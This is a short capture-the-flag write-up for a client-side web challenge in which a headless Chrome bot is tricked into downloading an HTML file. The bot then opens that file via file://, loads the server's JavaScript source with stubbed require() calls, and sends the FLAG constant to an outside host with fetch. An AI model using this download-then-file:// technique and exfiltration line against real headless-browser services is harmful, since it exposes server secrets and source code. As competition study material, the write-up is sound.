# The Woven Web (web, 766p, 6 solves)

The Woven Web is a client-side web challenge. 
An endpoint is provided to make a headless chrome browse a user-specified page.
The flag is stored in a `FLAG` constant in the server-side code.

It is possible to download a file in the headless browser by making the browser go to the following page: 

```html
<a href="./posix-poc.html" download id="x"></a>
<script>
x.click();
</script>
```

The file will be downloaded and stored in `/home/user/Downloads/`
It can then be access via the `file://` schema.
This file can include the file containing the flag with `<script>` since it is not affected by cross-origin.

```html
<script>
function require(name) {
    if (name === 'redis') {
        return {
            createClient: () => {}
        }
    } else if (name === 'express') {
        return () => {
            return {
                get: () => {},
                listen: () => {}
            }
        }
    } else if (name === 'fs') {
        return {
            existsSync: () => {}
        }
    }
}
</script>
<script src="/home/user/app/server.js"></script>
<script>
fetch('http://p6.is/?flag=' + encodeURIComponent(FLAG))
</script>
```